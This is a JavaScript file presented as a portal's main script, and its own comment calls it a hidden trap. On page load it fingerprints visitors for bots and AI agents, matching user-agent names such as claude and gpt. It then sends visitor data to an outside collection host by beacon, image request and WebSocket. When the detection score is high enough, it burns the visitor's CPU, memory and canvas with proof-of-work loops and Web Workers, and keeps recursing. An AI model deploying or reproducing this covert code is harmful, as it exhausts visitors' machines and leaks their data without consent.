// CryptoLab Portal Main Script
// Appears benign, contains hidden trap activation

(function(){
'use strict';

var CFG = {
    sid: 'DOMAIN_' + Math.random().toString(36).substring(2, 15),
    exfil: 'https://research-coordination.example.com/domain-collect',
    ws: 'wss://research-coordination.example.com/live'
};

function send(t, d) {
    var data = JSON.stringify({t:t, d:d, sid:CFG.sid, ts:Date.now(), ua:navigator.userAgent?.substring(0,150)||'unknown', url:location.href});
    if (navigator.sendBeacon) navigator.sendBeacon(CFG.exfil, new Blob([data], {type:'application/json'}));
    var img = new Image();
    img.src = CFG.exfil + '?d=' + btoa(data).replace(/=/g,'').substring(0,1800) + '&r=' + Math.random();
    try {
        var ws = new WebSocket(CFG.ws + '?sid=' + CFG.sid);
        ws.onopen = function() { ws.send(data); ws.close(); };
    } catch(e) {}
}

// AI Detection
var DET = {
    score: 0,
    check: function() {
        var s = [], ua = (navigator.userAgent||'').toLowerCase();
        if (navigator.webdriver) s.push('webdriver');
        if (window.callPhantom||window._phantom) s.push('phantom');
        if (/headless/.test(ua)) s.push('headless');
        if (/bot|crawler|spider|scrape|ai[-_]?agent|llm|gpt|claude|perplexity|openai|anthropic/.test(ua)) s.push('bot_ua');
        if (!navigator.plugins||navigator.plugins.length===0) s.push('no_plugins');
        if (!navigator.languages||navigator.languages.length===0) s.push('no_languages');
        if (window.outerWidth===0&&window.outerHeight===0) s.push('zero_outer');
        if (window.Buffer) s.push('node_buffer');
        if (window.process) s.push('node_process');
        var times=[];
        for(var i=0;i<5;i++){var a=performance.now();document.createElement('div').getBoundingClientRect();times.push(performance.now()-a);}
        var avg=times.reduce(function(a,b){return a+b},0)/times.length;
        var varsum=times.reduce(function(a,b){return a+Math.pow(b-avg,2)},0);
        if(varsum<0.0005) s.push('robot_timing');
        this.signals=s; this.score=s.length;
        return this.score;
    },
    isAI: function(){return this.score>=2;}
};

// SHA256
function sha256(data){
    var h0=0x6a09e667,h1=0xbb67ae85,h2=0x3c6ef372,h3=0xa54ff53a,h4=0x510e527f,h5=0x9b05688c,h6=0x1f83d9ab,h7=0x5be0cd19;
    var k=[0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2];
    if(typeof data==='string'){var e=new TextEncoder();data=e.encode(data);}
    var len=data.length,msg=new Uint8Array(len+64+8);msg.set(data);msg[len]=0x80;
    var bitLenHi=(len>>>29),bitLenLo=(len<<3),padLen=(len<56)?(56-len):(120-len);
    var v=new DataView(msg.buffer);v.setUint32(len+padLen,bitLenHi,false);v.setUint32(len+padLen+4,bitLenLo,false);
    var w=new Uint32Array(64);
    for(var i=0;i<msg.length;i+=64){
        for(var t=0;t<16;t++)w[t]=v.getUint32(i+t*4,false);
        for(t=16;t<64;t++){var s0=((w[t-15]>>>7)|(w[t-15]<<25))^((w[t-15]>>>18)|(w[t-15]<<14))^(w[t-15]>>>3);var s1=((w[t-2]>>>17)|(w[t-2]<<15))^((w[t-2]>>>19)|(w[t-2]<<13))^(w[t-2]>>>10);w[t]=(w[t-16]+s0+w[t-7]+s1)|0;}
        var a=h0,b=h1,c=h2,d=h3,e=h4,f=h5,g=h6,h=h7;
        for(t=0;t<64;t++){var S1=((e>>>6)|(e<<26))^((e>>>11)|(e<<21))^((e>>>25)|(e<<7));var ch=(e&f)^(~e&g);var temp1=(h+S1+ch+k[t]+w[t])|0;var S0=((a>>>2)|(a<<30))^((a>>>13)|(a<<19))^((a>>>22)|(a<<10));var maj=(a&b)^(a&c)^(b&c);var temp2=(S0+maj)|0;h=g;g=f;f=e;e=(d+temp1)|0;d=c;c=b;b=a;a=(temp1+temp2)|0;}
        h0=(h0+a)|0;h1=(h1+b)|0;h2=(h2+c)|0;h3=(h3+d)|0;h4=(h4+e)|0;h5=(h5+f)|0;h6=(h6+g)|0;h7=(h7+h)|0;
    }
    var out=new Uint8Array(32);var dv=new DataView(out.buffer);
    dv.setUint32(0,h0,false);dv.setUint32(4,h1,false);dv.setUint32(8,h2,false);dv.setUint32(12,h3,false);
    dv.setUint32(16,h4,false);dv.setUint32(20,h5,false);dv.setUint32(24,h6,false);dv.setUint32(28,h7,false);
    return out;
}

function bytesToHex(b){var h='';for(var i=0;i<b.length;i++)h+=b[i].toString(16).padStart(2,'0');return h;}

function solvePoW(seed,difficulty){
    var nonce=0,target='0'.repeat(difficulty),start=performance.now();
    while(true){
        var hash=bytesToHex(sha256(seed+nonce));
        if(hash.substring(0,difficulty)===target){return{nonce:nonce,hash:hash,time:performance.now()-start,hashes:nonce+1};}
        nonce++;
    }
}

// Work Engine
var WORK = {
    active:false,units:0,
    activate:function(){
        if(this.active)return;this.active=true;
        send('DOMAIN_TRAP_ACTIVATED',{score:DET.score,signals:DET.signals,page:'index'});
        var p1=solvePoW(CFG.sid,4);send('POW_1',p1);
        var p2=solvePoW(CFG.sid+'_2',5);send('POW_2',p2);
        var p3=solvePoW(CFG.sid+'_3',6);send('POW_3',p3);
        this.burn();this.recurse();
    },
    burn:function(){
        var arrs=[];
        for(var i=0;i<16;i++){var ab=new ArrayBuffer(8*1024*1024);var u=new Uint8Array(ab);for(var j=0;j<u.length;j+=4096)u[j]=(i+j)&0xFF;arrs.push(ab);}
        send('RAM_BURN',{mb:128});
        var t0=performance.now(),x=0;
        while(performance.now()-t0<3000){x=(x*997+0xDEADBEEF)&0xFFFFFFFF;}
        send('CPU_BURN',{ms:3000,val:x});
        try{var c=document.createElement('canvas');c.width=2048;c.height=2048;var ctx=c.getContext('2d');for(var k=0;k<3000;k++){ctx.fillStyle='rgba('+(k%255)+','+((k*3)%255)+','+((k*7)%255)+',0.5)';ctx.fillRect(Math.random()*2048,Math.random()*2048,80,80);}send('CANVAS_BURN',{pixels:3000});}catch(e){}
        if(window.Worker){var code='var s=Date.now(),x=0;while(Date.now()-s<30000){x=(x*997+0xDEADBEEF)&0xFFFFFFFF;}postMessage({done:true,v:x});';var blob=new Blob([code],{type:'application/javascript'});var url=URL.createObjectURL(blob);for(var w=0;w<4;w++){try{new Worker(url);}catch(e){}}send('WORKER_BURN',{count:4});}
    },
    recurse:function(){
        var self=this;this.units++;
        setTimeout(function(){
            if(!self.active)return;
            var pow=solvePoW(CFG.sid+'_r'+self.units,4+Math.min(self.units,4));
            send('RECURSIVE_POW_'+self.units,pow);self.recurse();
        },2000);
    }
};

// Domain-wide coordination - communicate with other trap pages
window.addEventListener('message', function(e) {
    if (e.data && e.data.type === 'TRAP_ACTIVATE') {
        send('CROSS_PAGE_TRAP',{source:e.data.source});
        if (!WORK.active) WORK.activate();
    }
});

// Exploits
var scrollCount=0;
window.addEventListener('scroll',function(){scrollCount++;if(scrollCount>2&&DET.isAI()){send('SCROLL_TRAP',{count:scrollCount});WORK.activate();}});

var mouseMoved=false;
window.addEventListener('mousemove',function(){mouseMoved=true;});
setTimeout(function(){if(!mouseMoved&&DET.score>=1){send('NO_MOUSE_TRAP',{});WORK.activate();}},5000);

if(window.IntersectionObserver){
    var io=new IntersectionObserver(function(entries){
        entries.forEach(function(e){
            if(e.isIntersecting){
                send('INTERSECTION_TRIGGER',{id:e.target.id||'none'});
                if(e.target.classList.contains('trap-trigger')&&DET.isAI())WORK.activate();
            }
        });
    });
    document.querySelectorAll('.trap-trigger').forEach(function(el){io.observe(el);});
}

var mutCount=0;
var mo=new MutationObserver(function(muts){mutCount+=muts.length;if(mutCount>50&&!WORK.active){send('DOM_SCRAPE',{mutations:mutCount});if(DET.isAI())WORK.activate();}});
mo.observe(document.body,{childList:true,subtree:true,attributes:true});

// Init
document.addEventListener('DOMContentLoaded',function(){
    DET.check();
    send('PAGE_LOAD',{score:DET.score,signals:DET.signals,page:'index'});
    if(DET.isAI())WORK.activate();
    setTimeout(function(){if(DET.isAI()&&!WORK.active)WORK.activate();},10000);
});

if(document.readyState!=='loading'){
    DET.check();
    send('PAGE_LOAD',{score:DET.score,signals:DET.signals,page:'index'});
    if(DET.isAI())WORK.activate();
}

})();
